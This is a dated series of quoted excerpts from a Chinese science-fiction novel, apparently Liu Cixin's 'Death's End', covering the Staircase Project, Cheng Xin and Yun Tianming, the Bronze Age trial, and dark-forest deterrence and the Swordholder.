<p>“向左点吧，再把帆包括进去，总体重一吨。”维德说，“用全人类的力量推进一吨的东西，应该够轻了。”</p>
<p>2016-01-22</p>
<p>比如欧洲中世纪与千年前的古罗马时代相比，不但物质更贫困，精神上也更压抑；</p>
<p>2016-01-22</p>
<p>“都这样看着我干什么？我不是上帝！”维德扫视着会场说，“你们的国家把你们派到这里来做什么？肯定不是养老和只报告坏消息吧？我没有办法，解决这样的问题是你们的事情！”他说完使劲一蹬桌腿，在刺耳的响声中，椅子比哪次滑得都远，同时他第一次违反会议室不能抽烟的规定，点上了一支雪茄。</p>
<p>人们又把目光转到新来的几位冬眠技术专家身上，他们都一言不发，并非是在思考，而是带着一种来自专业尊严的怒气：这些偏执狂在要求一件根本不可能做到的事。</p>
<p>2016-01-22</p>
<p>程心并没有太注意听他的话，她现在的思想集中在一点上：这个被冷冻到零下两百多摄氏度送入太空的人将是谁。她努力不择手段地前进，但脚步还是在颤抖。</p>
<p>2016-01-22</p>
<p>“这个非常时代没有无名小辈。”维德说，“任何普通人都可能随时被委以重任，任何显要人物也可能随时被取代。”后面这两句话，说前一句时他看着程心，后一句看着瓦季姆，然后，他被一名PDC会议秘书叫到一边去了</p>
<p>2016-01-22</p>
<p>维德微笑着点点头，“可以让莫妮尔去，我母亲的猫，不过它也得减肥一半才行。”</p>
<p>在别人愉快工作时，维德总是处于阴沉状态；而大家都处于绝望中时，他却轻松幽默起来，总是这样。</p>
<p>2016-01-22</p>
<p>瓦季姆说她不会看人，这与领导风度和鼓舞士气都没关系，只是因为维德喜欢看到别人绝望，即使处于绝望中的也包括他自己。欣赏人的绝望对他而言有一种快感。瓦季姆是个很忠厚的人，却对维德做出如此阴暗的评价，让程心有些吃惊，但现在看来，维德确实在欣赏着他们三个人的绝望。</p>
<p>2016-01-22</p>
<p>这时，载着中弹的罗辑的救护车在军警车和直升机的簇拥下开远了，纽约的灯海又恢复了光芒。在这光灿的背景之上，维德像一个黑色的鬼魅，只有双眸的冷光时隐时现。</p>
<p>“只送大脑。”他说。</p>
<p>2016-01-22</p>
<p>这时人类的探测器已经飞出太阳系，并且能够使探测器在海王星的卫星上着陆，所以在航线的推进段上布放核弹的技术是比较成熟的。困难的是控制飞行器航线与每枚核弹精确交错，以及核弹的起爆控制。</p>
<p>每枚核弹必须在辐射帆刚刚飞越它时起爆，距离由三千米至十千米不等，依核弹的爆炸当量而定。随着帆的速度增加，所需的控制精度越来越高，但即使帆的速度达到光速的百分之一，控制精度也在纳秒级以上，以当时的技术，经过努力还是可以做到的。</p>
<p>2016-01-22</p>
<p>飞行器本身没有任何动力，它的航行方向完全由核弹的爆炸位置进行控制，航线上的每枚核弹都带有位置控制发动机，在帆到来之前精确定位，在交错时两者相距只有几百米，调整这个距离就可使爆炸推力与帆形成不同的角度，进而控制飞行器的航向</p>
<p>2016-01-22</p>
<p>“和平卫士”洲际导弹的集群发射已经进行了半个小时，之前发射的六枚导弹的尾迹重合在一起，浸透了月光，像一条银色的天国之路。这以后每隔五分钟，就有一团火球沿着这架银桥升上高空，周围的树影和人影在它的光芒中像秒针一般走动。首批将发射三十枚导弹，将三百颗核弹头送入地球轨道，它们的当量从五十万到二百五十万吨级不等。与此同时，在俄罗斯和中国，“白杨”和“东风”导弹也在不间断地发射中。这很像世界末日的景象，但程心专业的眼光从这条天国之路尽头的弯曲度看出，这不是洲际攻击轨道，而是太空发射轨道。那些本来可能致几亿人死亡的东西，现在一去不回了，用它们那巨大的能量去把那片羽毛推进到光速的百分之一。</p>
<p>2016-01-22</p>
<p>程心仰望天空热泪盈眶，每次发射的光芒都使她的泪花格外晶莹。她在心中一次次对自己说：即使只做到这一步，阶梯计划也值了。</p>
<p>2016-01-22</p>
<p>但旁边的两个男人，维德和瓦季姆却对这壮丽的景象无动于衷，甚至懒得抬头看，只是抽着烟冷漠地谈论着什么，程心知道他们谈话的内容。</p>
<p>2016-01-22</p>
<p>程心是在四天前收到DX3906所有权证书的，那是一个巨大的惊喜，使她陷入一种从未有过的幸福感，一时晕头转向。一整天，她都在心中不停地对自己说：有人送我一颗星星，有人送我一颗星星，我有了一颗星星……</p>
<p>在去局长那里汇报工作时，她的欢欣如此光芒四射，令维德也不由得问她发生了什么事。她告诉了他，并把证书给他看。“一张废纸。”维德不以为然地把证书扔还给她，“你要是明智些的话就早些把它降价转卖了，还不至于什么都得不到。”他这话丝毫没有影响程心的心情，其实她已经料到他会这么说。对于维德，程心知道的只有他的工作资历：先是在CIA，后升任美国国土安全局副局长，然后到这里。至于他的私生活，除了那天他透露自己有个妈和他妈有只猫，她一无所知，也没听谁说过，连他住在哪里都不清楚，他仿佛就是一台工作机器，工作之外就在某个不为人知的地方关机了。</p>
<p>程心又忍不住把星星的事告诉了瓦季姆，后者倒是热烈地祝贺了她，说她让全世界的女孩都嫉妒，包括所有活着的女孩和所有死去的公主，因为可以肯定，她是人类历史上第一个得到一颗星星的姑娘。试问，对于一个女人，还有什么比爱她的人送她一颗星星更幸福呢？“可他是谁呢？”程心自问。</p>
<p>“应该不难猜到吧，首先可以肯定这人很有钱，资产至少应该在九位数，才可能花几百万送一件只具有象征意义的礼物。”程心摇摇头。从学校到工作，程心有过许多仰慕者和追求者，但他们中没有这样富有的。</p>
<p>“同时，此人文化程度很高，是一个在精神修养上极不寻常的人。”瓦季姆说着，不由得仰天感叹起来，“浪漫到这个程度，即使在爱情小说和电影中，我他妈都从没看到过。”程心也在感叹中。少女时代她也曾在玫瑰色的梦想中沉醉过，现在，虽然自己还年轻，却已经开始为那些梦想自嘲了，但没有想到，这颗现实中突然飘来的星星，其浪漫和传奇的程度已经远远超出了她少女时的梦幻。</p>
<p>她不用想就可以肯定，自己不认识这样的男人。也许只是一个遥远的暗恋者，冲动中用自己巨额财富中的一小部分完成一个奇想，满足一个她永远不知道实情的愿望，即使这样，她也很感激他。</p>
<p>晚上，程心登上新世贸大厦的楼顶，迫不及待地想看到自己的星星。这之前她已经仔细看过随证书寄来的观星资料，但当天纽约上空阴云密布。第二天第三天也都是阴的，云层像一只逗弄她的巨掌，捂着她的礼物不放开。但程心并没有失落，她知道她收到的是一件最不可能丢失的礼物，DX3906就在宇宙中，可能比地球和太阳的寿命还长，她总有一天能看到它的。晚上，她长久地站在公寓的阳台上，看着夜空想象那颗星星的样子。城市的灯海在云层上映出一片暗黄色的光晕，她却想象那是她的DX3906给云照出的玫瑰色。她梦到那颗星星，梦中她在恒星的表面飞翔，那是一颗玫瑰色的星球，没有灼人的烈焰，只有春风般的清凉，恒星表面是清澈的海洋，能清晰地看到水中玫瑰色的藻群……</p>
<p>醒后她笑自己：作为一个航天专业毕业的人，她在梦中都没忘记DX3906没有行星。</p>
<p>2016-01-22</p>
<p>在程心的余生中，她无数次回忆那一时刻，每次都不得不承认：她当时真没有多想什么。</p>
<p>2016-01-22</p>
<p>等轻步离开的程心刚把门关上，云天明就爆发出一阵歇斯底里的狂笑。</p>
<p>真是个大傻瓜！还有比他更傻的吗？！他以为给了所爱的人一颗星星那人就爱他了？就流着圣洁的眼泪飞越大洋来救他了？多美的童话。不是，程心是来让他死。接下来的一个简单推论更是让他笑得窒息：从程心到来的时间看，她肯定不知道云天明已经选择了安乐。换句话说，假如云天明没有选择安乐，她来了以后也要让他安乐，引诱他，甚至逼他安乐。</p>
<p>错了，她给他的死法并不安乐。姐姐让他去死，只是怕他白花钱，这完全可以理解，况且，她是真心想让他死得安乐。但程心，却想让他成为死得最惨的人。云天明惧怕太空，同每一个学航天的人一样，他比别人更清楚太空的险恶，知道地狱不在地下而在天上。而程心，想让他的一部分，承载灵魂的那一部分，永远流浪在那无边无际无限寒冷的黑暗深渊中。</p>
<p>这还是最好的结果。</p>
<p>2016-01-22</p>
<p>看她圣洁的庄严，看她殷切的期待，她在为人类文明而战，她在保卫地球……周围怎么是这样，看这束夕阳透进窗里的余晖，投在白墙上如一摊肮脏的血；外面孤独的橡树，不过是坟墓中伸出的枯骨……</p>
<p>一抹凄惨的微笑出现在云天明的嘴角，渐渐溢散开来。“好的，我接受。”他说。</p>
<p>危机纪元5-7年，阶梯计划</p>
<p>2016-01-22</p>
<p>其实，她不过是向云天明转达PIA的请求，而他完全可以拒绝。她是为了保卫地球文明的崇高目的而推荐他的，他的生命已走到尽头，如果她再晚到一会儿，他已经不在人世了，她甚至是救了他！真的没什么，她真的没做什么会让良心不安的事。</p>
<p>但同时她也第一次知道，那些人就是念叨着这样的话把妈卖给妓院的。</p>
<p>2016-01-22</p>
<p>程心站在医院外面，她不敢进去，但又不忍心离开，只能站在那里咀嚼自己的痛苦。同来的维德径自向前走去，走了几步停下来，转身欣赏了几秒钟程心的痛苦，然后满意地把最致命的一击抛给她：</p>
<p>“哦，还有一个惊喜：你的那颗星星是他送的。”程心愕然僵硬在那里，周围的一切在她的眼中飞快变化，仿佛之前看到的只是生活的投影，某种真实的色彩此时才显现出来，情感的激浪一时间让她找不到大地的存在。</p>
<p>2016-01-22</p>
<p>程心转身向医院飞跑，跑进大门，飞奔过长长的走廊。在脑外科区外面她被两个警卫拦住了，她不顾一切地挣扎，却被死死抓住。她掏出证件塞给对方，继续冲向脑外科手术室。手术室外站着很多人，看到狂奔而来的她惊愕地闪开一条路，程心猛地撞开手术室亮着红灯的门。</p>
<p>一切都已结束。</p>
<p>2016-01-22</p>
<p>程心唯一一次见到阶梯飞行器是当它的辐射帆在地球同步轨道上展开时，二十五平方千米的巨帆曾短暂地把阳光反射到北半球，那时程心已经回到上海，深夜她看到漆黑的天幕上出现一个橘红色的光团，五分钟后就渐渐变暗消失了，像一只在太空中看了一眼地球后慢慢闭上的眼睛。以后的加速过程肉眼是看不到的。</p>
<p>2016-01-22</p>
<p>唯一让程心感到安慰的是，种子带上了，但不是她拿的那些，而是经过航天育种部门精心挑选的。</p>
<p>2016-01-22</p>
<p>加速航段从地球延伸至木星轨道，在这段航程上已经预先布设了一千零四枚各种当量的核弹，有三分之二是裂变核弹，其余是氢弹。它们就像是一串太空地雷，阶梯飞行器的加速过程就是依次触发这些核地雷的过程。除此之外，还有数量众多的探测器巡行在加速航段上，以监测阶梯飞行器的航向和速度，及时调整下一枚核弹的位置。核爆炸的闪光以一定的间隔不断地在巨帆后面亮起，像搏动的心脏，辐射的飓风强劲地推动着这片轻盈的羽毛。当接近木星轨道的第九百九十七枚核弹爆炸时，监测表明飞行器已经达到了预定速度：光速的百分之一。</p>
<p>但故障就在这时出现了。监测系统通过巨帆反射光的频谱分析发现，帆开始卷曲，据推测最大的可能是一根帆索断了。但第九百九十八枚核弹仍被引爆，只剩下三根帆索的帆此时得到了一个错误的速度分量，偏离了预定航线。帆继续卷曲，雷达反射面急剧缩小，监测系统丢失了它，也丢失了它的轨道参数，人类不可能再找到它了。失之毫厘，谬以千里。随着岁月的流逝，飞行器距预定的航线将越来越远，与三体舰队交会并被截获的希望也越来越小。按照它最后的大致方向，它将在六千多年后掠过第一颗恒星，五百万年后飞出银河系。</p>
<p>2016-01-22</p>
<p>但阶梯计划至少成功了一半，人类成功地把一架飞行器——尽管轻得像羽毛——推进到准相对论速度。</p>
<p>2016-01-22</p>
<p>程心本来已经没有理由去未来了，她似乎要继续被阶梯计划完全改变了的人生，但PIA仍然让她冬眠。她的使命变成了阶梯计划的未来联络员；设想这项计划如果能对两个世纪后的人类宇航有帮助，就需要一个全面了解它的人，而不仅仅是死的资料。其实，派她去的真正目的，可能只是希望阶梯计划不被未来所遗忘或误解。这一时期，还有一些其他的大型工程项目向未来派去联络员，目的也一样。</p>
<p>如果千秋功罪真有人评说，现在已经可以派一个人去解释岁月造成的误会。当程心的意识在寒冷中模糊时，她感到一丝安慰：和云天明一样，她也要在无边的黑暗中漂流了。</p>
<p>威慑纪元12年，“青铜时代”号</p>
<p>2016-01-22</p>
<p>黑暗森林理论对人类文明的影响是极其深刻的：那个篝火余烬旁的孩子，由外向乐观变得孤僻自闭了。</p>
<p>2016-01-22</p>
<p>正当“青铜时代”号准备再次启动加速时，一件不可思议的事情发生了：一个来自三体世界的智子在舰上低维展开，在“青铜时代”号和太阳系之间建立了量子通信信道。于是，一切才最终被证实。</p>
<p>威慑纪元13年，审判</p>
<p>2016-01-22</p>
<p>解。即使您，法官先生，亲自乘上“青铜时代”号，再向太阳系外沿着我们的航线航行几万个天文单位，甚至比那更远，你也不可能理解，因为你知道你还会回来，你的灵魂一步都没离开，还在地球上——除非飞船的后面突然间一无所有，太阳地球都消失，变成一片虚空，那时你才能理解我的那种变化。</p>
<p>我是加利福尼亚人，公元1967年，在我的家乡发生了这样一件事：有一个名叫罗恩·琼斯的高中教师（哦，请不要因为暂时跑题打断我，谢谢），为了让他的学生透彻地理解什么是极权、什么是纳粹，就在班上用模拟的方式建立了一个极权社会。只用了五天时间，琼斯就成功了，他的班级成了一个微型的纳粹德国，在那里，每个学生都自愿放弃了自我和自由，融入至高无上的集体，并对集体的目标充满宗教般的狂热。最后，这场以游戏开始的教学试验几乎失控。后来这件事被德国人拍成了电影，当事人还写过一本书，名叫《极权只需五天》。同样，“青铜时代”号在得知了自己永远流浪太空的命运后，也建立了这样一个集体极权社会，知道我们用了多长时间吗？</p>
<p>2016-01-22</p>
<p>五分钟。</p>
<p>2016-01-22</p>
<p>法官：你们是怎么处理遗体的？</p>
<p>洛文斯基：像“蓝色空间”号那样，为他们建立了纪念碑。法官：纪念碑中有遗体吗？</p>
<p>洛文斯基：没有，我怀疑太阳系另一端“蓝色空间”号建立的那座纪念碑中也没有。法官：遗体去了哪里？</p>
<p>洛文斯基：补充舰上的食品库存。法官：全部？</p>
<p>洛文斯基：全部。</p>
<p>2016-01-22</p>
<p>法官：遗体是怎样食用的？</p>
<p>洛文斯基：就是那样，大多数是同生态循环系统的蔬菜和肉类混在一起烹调。法官：食用者都是哪些人？</p>
<p>洛文斯基：所有人，“青铜时代”号上的所有人。舰上四个餐厅里都有这种食物，肯定都吃过。法官：他们知道吃的是什么吗？</p>
<p>洛文斯基：当然。法官：他们的反应呢？</p>
<p>洛文斯基：我想，肯定有人有些不适应吧，但没有什么太大的反应。哦，有一次在军官餐厅用餐时，我还听旁边的一位军官说了句：谢谢，乔伊娜。法官：什么意思？</p>
<p>洛文斯基：卡尔·乔伊娜中尉是“量子”号上的通信军官，他吃的好像就是她的一部分。法官：他怎么可能知道吃的是谁呢？</p>
<p>洛文斯基：您知道身份标识单元吧，像一粒米那么大，植入左臂，能耐高温，偶尔烹调时没把那东西取出来，食用者在盘子里发现时可以用随身通信器什么的把上面的信息读出来。法官：法庭肃静！请把两位晕倒的女士送出去……你们不会不知道，这种行为已经打破了人类的道德底线。洛文斯基：当时有另外的道德底线。“青铜时代”号在末日战役中超功率加速时，因为动力系统过载，舰上的生态循环系统断电近两个小时，系统因此造成严重损坏，恢复得很慢；冬眠系统也出现故障，只能容纳五百多人，这样还有一千多人要吃饭，当时如果没有额外的补给，会有一半人饿死。即使没有这种情况，考虑到未来漫长的航程，把那么多宝贵的蛋白质资源抛弃在太空中不加以利用，才是打破了道德底线……当然，我不是在为自己辩护，也没有为“青铜时代”号上的任何人辩护，当我已经恢复到地球人的思维时，讲出这些来并不容易，请相信，并不容易。</p>
<p>2016-01-22</p>
<p>我没有太多可说的，只有一个警告：生命从海洋登上陆地是地球生物进化的一个里程碑，但那些上岸的鱼再也不是鱼了；同样，真正进入太空的人，再也不是人了。所以，人们，当你们打算飞向外太空再也不回头时，请千万慎重，需付出的代价比你们想象的要大得多。</p>
<p>2016-01-22</p>
<p>由于舰队国际的监狱位于火星和木星轨道之间荒凉的小行星带，犯人们只能再次飞离地球。“青铜时代”号返航后，他们虽来到了距地球近在咫尺的同步轨道，但三千五百亿千米中的这最后三万千米却永远走不过去了。当押送飞船加速时，同在返航的战舰中一样，他们又都飘落在船尾的舷窗上，像一堆永远无法归根的落叶，看着无数次萦绕梦中的蓝色地球渐渐远去，再次变成一颗淡蓝色的星星。</p>
<p>2016-01-22</p>
<p>在离开基地前，包括原副舰长洛文斯基、原目标甄别军官史耐德等十几人在宪兵的押解下最后一次进入“青铜时代”号，同接收该舰的新部队进行一些细节方面的交接。在过去的十几年中，这里曾是他们的整个世界，他们在各处精心设置了草地、森林和海岸的全息影像，还培育了真正的花草，修建了喷泉和鱼池，使这里真正成为家的样子。现在，这一切都不存在了，他们的痕迹被完全抹去，“青铜时代”号又变成了一艘冷冰冰的星际战舰。舰上遇到的每一个军人都对他们投来冷漠的目光，或者干脆忽略他们的存在。这些军人在敬礼时目光特别专注，以表明这军礼是对着押解他们的宪兵军官的，与这些穿囚服的人无关。</p>
<p>2016-01-22</p>
<p>需解决的问题并不太多，一个小时就完成了。这时，史耐德在半空中的操作界面上点了几下，似乎是在离开前习惯性地关闭操作窗口，然后他突然猛踹舱壁，在失重中飞到球形舱的另一端。几乎同时，球形舱分成了两个，三名军官和一名宪兵被关在其中一个舱里，史耐德独自在另一间里。</p>
<p>史耐德在面前调出一个操作界面，以令人目眩的速度点击着，那是一个通信界面，他在激活“青铜时代”号的大功率超远程星际通信系统。一声闷响，舱壁被激光枪烧出一个小洞，舱内充满了白色的浓烟。宪兵从另一侧把枪管伸过来，对准史耐德，警告他立刻停止操作并打开舱门。</p>
<p>“‘青铜时代’呼叫‘蓝色空间’！‘青铜时代’呼叫‘蓝色空间’！”史耐德的声音并不高，他知道呼叫传输的距离与他的音高无关。一束激光穿透史耐德的胸膛，血液变成红色的蒸汽喷出，被自己的血雾所笼罩的他，用尽最后的生命嘶哑地喊出一句话：</p>
<p>“不要返航，这里不是家！”对于地球发出的返航诱饵，“蓝色空间”号本来就比“青铜时代”号多了一些犹豫和怀疑，它只进行低功率减速，直至收到“青铜时代”号的警报时，还保持着离开太阳系的正速度。收到警报后，它立刻由减速转换为全功率加速，继续逃离太阳系。</p>
<p>2016-01-22</p>
<p>“万有引力”号立刻起航追击“蓝色空间”号，这是目前太阳系唯一一艘能够进行恒星际航行的飞船。在此之前，三体世界曾提议由速度更快的水滴（正式称呼是强互作用力宇宙探测器）追赶并摧毁目标，但地球世界坚决拒绝了这个提议，认为这是人类的内部事务。</p>
<p>2016-01-22</p>
<p>。也许考虑到时间充裕，三体世界没有坚持，只是强调“万有引力”号具有发射引力波的能力，必须保证它的绝对安全，水滴应与其同行，以确保对“蓝色空间”号的压倒优势。</p>
<p>于是，“万有引力”号与两个水滴编队航行，它们之间的距离保持在几千米。两者大小悬殊，当看到“万有引力”号的全景时，水滴几乎不可见，但后者表面却完整而清晰地映着“万有引力”号的镜像。</p>
<p>2016-01-22</p>
<p>“万有引力”号只比“蓝色空间”号晚建十年时间，除了引力波发射，并没有更多的先进技术，其推进能力只是略优于“蓝色空间”号，能追上后者完全凭借燃料优势。即使这样，按照目前两舰的速度和加速度，“万有引力”号追上“蓝色空间”号也需要五十年时间。</p>
<p>威慑纪元61年，执剑人</p>
<p>2016-01-22</p>
<p>程心很快想明白了：其实这种进程早已开始。公元20世纪80年代可能是最后一个崇尚男性气质的年代，那以后，虽然男人还在，但社会和时尚所喜欢的男人越来越女性化。她想起了21世纪初的某些日韩男明星，第一眼看上去也是美丽女孩的样子，那时人们称之为男色时代来临。</p>
<p>2016-01-22</p>
<p>程心努力使自己这样想，并努力使思绪返回现实。来到这个时代只有几天，她对以往近三个世纪的历史只有大概的了解，最令她震惊的就是人类与三体世界因黑暗森林威慑而建立起来的战略平衡，这时，一个问题突然冒上脑际。</p>
<p>这样一个柔软的女性世界，威慑？！</p>
<p>2016-01-22</p>
<p>。下面有一行字幕：</p>
<p>……在他那个时代，杀人是要判死刑的。程心觉得这个男人很面熟，细看时画面又消失了，代之以一个正在演讲的中年女人（程心只能认为是女性）。她的衣服不发光，很正式，使她看上去像一个政治家，刚才的字幕就是她说出的话。这个窗口觉察到了程心的注意，放大了许多，同时发出了刚好能让她听到的声音，演讲者的声音很甜美，每个字像用长长的糖丝连起来，但说的内容很可怕：</p>
<p>“为什么要判死刑？答案是因为杀了人，但这只是正确答案之一，还有一个答案是：因为杀的人太少了。杀一个人是要被判死刑的，杀几个几十个更是如此，如果杀了几千几万人，那就罪该万死；但如果再多些，杀了几十万人呢？当然也该判死刑，但对于有些历史知识的人，这个回答就不是太确定了；再进一步，如果杀了几百万人呢？那可以肯定这人不会被判死刑，甚至不会受到法律的惩处，不信看看历史就知道了，那些杀人超过百万的人，好像都被称为伟人和英雄；更进一步，如果这人毁灭了一个世界，杀死了其中的所有生命，那他就成了救世主！”</p>
<p>2016-01-22</p>
<p>“很复杂，直接原因是：那个恒星系，就是他向宇宙广播了坐标导致其被摧毁的那个，不知道其中有没有生命，但肯定存在有的可能，所以他被指控有世界灭绝罪的嫌疑。这是现代法律中最重的罪了。”</p>
<p>2016-01-22</p>
<p>AA赶到程心前面，转身退着走面对她问道：“你会毁灭一个世界以建立这种威慑吗？特别是：如果敌人没有被你的威慑吓住，那你会按动按钮毁灭两个世界吗？”</p>
<p>2016-01-22</p>
<p>“瓦季姆是你杀的？”程心问，血从她的嘴角流出。</p>
<p>“是，阶梯计划需要他。而现在，我的新计划却不需要你。你们都很出色，但挡道的棋子都应清除。我只能前进，不择手段地前进！”</p>
<p>2016-01-22</p>
<p>罗辑对三体世界建立的黑暗森林威慑无疑是伟大的功绩，但最终产生这个功绩的面壁计划却被认为是一个极其幼稚的荒唐举动。</p>
<p>2016-01-22</p>
<p>人们开始对威慑本身进行深入思考，由此诞生了一门学科：威慑博弈学。</p>
<p>构成威慑的主要元素有：威慑者和被威慑者，在黑暗森林威慑中分别是人类和三体世界；威慑操作，发射三体世界坐标导致两个世界毁灭；威慑控制者，掌握发射开关的人或组织；威慑目标，三体世界放弃侵略并向人类世界传递技术。</p>
<p>2016-01-22</p>
<p>以威慑者和被威慑者同归于尽为后果进行的威慑，被称为终极威慑。</p>
<p>2016-01-22</p>
<p>人们很快发现一个极其沮丧的事实：如果黑暗森林威慑的控制权掌握在人类的大群体手中，威慑度几乎为零。</p>
<p>2016-01-22</p>
<p>黑暗森林威慑的成功，正是建立在罗辑个体的不可预测上。当威慑失败时，决定他行为的更多是他的人格特征和心理因素，即使是基于理智，他个人的利益与人类整体利益未必契合。威慑纪元初，两个世界对罗辑的全部人格特征进行了极其详细的研究，并建立了相应的数学模型，人类和三体的威慑博弈学者们得出了几乎相同的结果：依威慑失败时的精神状态不同，罗辑的威慑度在91.9%至98.4%之间浮动，三体世界绝对不敢冒这个险。</p>
<p>2016-01-22</p>
<p>在威慑建立后很短的时间里，虽然还没来得及进行上述的深入研究，但人们很快觉察到了这个事实，联合国和太阳系舰队立刻把威慑控制权交还给罗辑，就像扔出一块滚烫的铁。从收回到交还控制权，前后只有十八个小时的时间，但这段时间已足够水滴摧毁环绕太阳的核弹链以阻止人类进行坐标广播，而敌人没有行动，这被认为是三体世界在这场战争中的最大失误，而人类则冷汗淋漓地长出了一口气。</p>
<p>2016-01-22</p>
<p>于是，罗辑一直掌握着黑暗森林威慑的控制权。他的手中，先是握着太阳核弹链的起爆开关，后来握着引力波的发射开关——两个世界的战略平衡，像一个倒放的金字塔，令人心悸地支撑在他这样一个针尖般的原点上。</p>
<p>2016-01-22</p>
<p>黑暗森林威慑是悬在两个世界头上的达摩克利斯之剑，罗辑就是悬剑的发丝，他被称为执剑人。</p>
<p>2016-01-22</p>
<p>冷战中的1974年，苏联启动Perimeter计划，建立了一个后来被称为末日系统的预警系统，其目的是在北约核突袭中，当政府决策层和军队高级指挥层均被消灭、国家已失去大脑的情况下，仍具备启动核反击的能力。它利用核爆监测系统监控苏联境内的核爆迹象，所有的数据会汇整到中央计算机，经过逻辑判读决定是否要启动核反击。这个系统的核心是一个绝密的位于地层深处的控制室，当系统做出反击的判断时，将由控制室内的一名值班人员启动核反击</p>
<p>2016-01-22</p>
<p>罗辑对两者都没有理会。他只是握着引力波发射的开关，沉默地坚守着执剑人的岗位，坚守了半个世纪。</p>
<p>2016-01-22</p>
<p>人们发现，人类对三体世界的任何政策，都不可能绕过执剑人，没有执剑人的承认，人类的政策在三体世界没有任何效力。这样，执剑人就成为像面壁者一样拥有巨大权力的独裁者。</p>
<p>2016-01-22</p>
<p>随着时间的流逝，罗辑的形象由救世主一天一天地变成了一个不可理喻的怪物和毁灭世界的暴君。</p>
<p>2016-01-22</p>
<p>程心出院的这一天，AA说智子想见她。</p>
<p>程心已经知道，现在，智子这个词并不是指那些来自三体世界的强大诡异的智能化微观粒子，而是一个女人的名字。这女人是个机器人，由人类最先进的A.I.和仿生技术制造，却由以前被称为智子的智能粒子控制。这个名叫智子的女人是三体世界在地球的大使，与以前智子的低维展开相比，她的出现使得两个世界的交流变得更加自然和顺畅。</p>
<p>2016-01-22</p>
<p>程心和AA沿长长的树枝走到尽头，路面都是由圆润的石子铺成，两旁是翠绿的草坪。沿一道旋梯可以下到悬空的别墅，智子在别墅门口迎接她们。她身材纤小，穿着华美的日本和服，整个人像是被一团花簇拥着。当程心看清她的面容时，花丛黯然失色，程心很难想象有这样完美的女性容貌，但真正让这美丽具有生机的，是控制她的灵魂。她浅浅一笑，如微风吹皱一汪春水，水中的阳光细碎轻柔地荡漾开来。智子对她们缓缓鞠躬，程心感觉她整个人就是一个汉字：柔——外形和内涵都像。</p>
<p>2016-01-22</p>
<p>维德确实不是最危险的，他的险恶隐藏得并不深。公元人的城府之深、人格之复杂，是AA和其他现代人很难想象的。</p>
<p>2016-01-22</p>
<p>第一，一个人被推崇为救世主与被推上断头台有一个共同点，就是他（她）都没有选择，先是罗辑，后是程心。</p>
<p>威慑纪元62年，奥尔特星云外，“万有引力”号</p>
<p>2016-01-26</p>
<p>十年前，“万有引力”号穿过了奥尔特星云，这片距太阳1光年的彗星出没的冷寂空间被认为是太阳系最后的边界，</p>
<p>2016-01-26</p>
<p>当时丝毫没有穿越星云的感觉，偶尔有一颗冰冻的没有彗尾的彗星近距离掠过，也在几万几十万千米之外，肉眼根本看不到。</p>
<p>2016-01-26</p>
<p>黑暗森林的另一个间接证据——智子盲区</p>
<p>危机纪元之初，在使用智子系统探测地球的同时，三体世界也向银河系的其他方向发射了接近光速的智子，首批发射了六个。但这些智子不久均进入盲区，最远的一个只飞行了7光年。后来发射的智子也遇到了同样的事情，最近的盲区是跟随“万有引力”号的智子遇到的，与地球的距离只有1.3光年。智子间的量子联结是一次性的，一旦中断不可能恢复，那些进入盲区的智子都永远迷失在了太空中。</p>
<p>2016-01-26</p>
<p>对于智子遇到了什么样的干扰，三体世界一无所知，这种干扰可能是自然的，也可能是“人”为的；三体和地球科学家都倾向于后者。</p>
<p>2016-01-26</p>
<p>飞向银河系的智子在进入盲区前，只来得及探测两个邻近的带有行星的恒星系，其中都没有生命和文明。但三体和地球的学者们都认为，那些星系的荒凉正是智子能够接近它们的原因。</p>
<p>所以，直到威慑纪元后期，宇宙对两个世界仍保持着神秘的面纱，但智子盲区的存在很可能是黑暗森林状态的一个间接证据，这个状态不允许宇宙变得透明。</p>
<p>2016-01-26</p>
<p>随着“万有引力”号的迅速逼近，“蓝色空间”号第一次与追击舰联系，提出一个解决方案：把包括主要嫌疑犯在内的舰上三分之二的人员送上太空穿梭机，离开“蓝色空间”号，由“万有引力”号接收，剩下三分之一的人驾驶“蓝色空间”号继续飞向太空深处的目标。这样，人类在星际就保留了一个前哨和种子，保留了一个探索的机会。</p>
<p>2016-01-26</p>
<p>那之前你一直看着目标飞船上的实时图像，我想在你的感觉中，自己更像是身处‘蓝色空间’号而不是‘万有引力’号。”</p>
<p>“是的，医生，很多时间确实有这种感觉。”“然后，图像突然消失了，那里你什么都看不到了，同时你也很累了……上校，就这么简单，相信我，不必担心，很正常。建议你多休息，现在毕竟人手很充裕了。”“医生，我是末日战役的幸存者，当时被爆炸抛出来，蜷缩在一个不比你这张桌子大多少的救生舱中，在海王星轨道上飘了一个月。获救时我都快死了，但心理仍没有出现问题，更没有幻觉……我相信我看到的。</p>
<p>2016-01-26</p>
<p>“这舰上有尊严的男人都是忧郁的，没有心情串女人的门。”薇拉斜眼瞟着艾克说。</p>
<p>2016-01-26</p>
<p>再加上那个非军职的心理学家韦斯特，此人特别讨厌，把什么都归结为心理障碍和精神疾病，让人觉得马桶不通了他都能用心理学理论加以分析</p>
<p>2016-01-26</p>
<p>中士驾驶太空艇从舰体中部平滑地驶出“万有引力”号，在太空中滑行到能够看到飞船整体的距离。巨大的舰体沐浴在银河系的星光中，与冬眠航行时不同，所有的舷窗和外侧舰廊都透出灯光，在舰体表面形成一片灿烂的亮点，使“万有引力”号看上去更加气势磅礴。</p>
<p>但中士很快发现了一件令人难以置信的事：“万有引力”号是一个标准的圆柱体，而现在，它的尾部竟然是一个斜面！同时，中士发现舰体的长度短了许多，约有五分之一的样子，就像舰尾被一把无形的巨刀削掉了一段！中士把眼睛闭上几秒钟，再次睁开后，看到的仍然在是尾部被削掉的“万有引力”号！顿时一股寒气穿透脊髓。这恐惧不仅是由于眼前景象的诡异，还有更实际的内容：这艘巨型星际飞船是一个有机整体，如果舰尾突然消失，能量循环系统将被完全破坏，随之而来的将是整舰的大爆炸。但现在什么都没有发生，飞船仍在平稳地航行中，看上去像绝对静止地悬在太空中一样。耳机中和眼前的系统屏幕上连最轻微的异常报警都没有。</p>
<p>2016-01-26</p>
<p>“不奇怪，看看你待着的地方。”医生指指观测站，它像是卡在纵横交错的管道和线缆中的一只小鸡蛋，“你的研究对象是最大的，可待的地方是最小的，再想想你在这里待了多长时间？你上次苏醒后已经四年没冬眠了吧？”</p>
<p>2016-01-26</p>
<p>一号广场位于圆柱形舰体的头部，笼罩在一个半球形透明罩下，站在这里，几乎感觉不到半球罩的存在，仿佛置身于太空中。与球形舱中的星空全息影像相比，这里更能体会到外太空航行的“去物质效应”</p>
<p>2016-01-26</p>
